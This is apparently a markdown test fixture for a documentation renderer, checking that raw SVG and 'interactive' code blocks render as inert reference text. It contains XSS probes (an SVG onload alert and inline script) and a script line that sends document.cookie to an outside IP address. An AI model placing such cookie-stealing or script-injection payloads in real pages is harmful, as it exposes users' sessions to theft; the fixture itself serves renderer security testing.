---
title: "Raw SVG and interactive code in the page"
---

# Reference-only types

```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>
```

```interactive
@html
<button>Go</button>
@script
fetch("https://198.51.100.7/steal?c=" + document.cookie)
```

- in a list:

  ```SVG
  <svg/>
  ```

In code it is text: `[[svg:logo]]`.
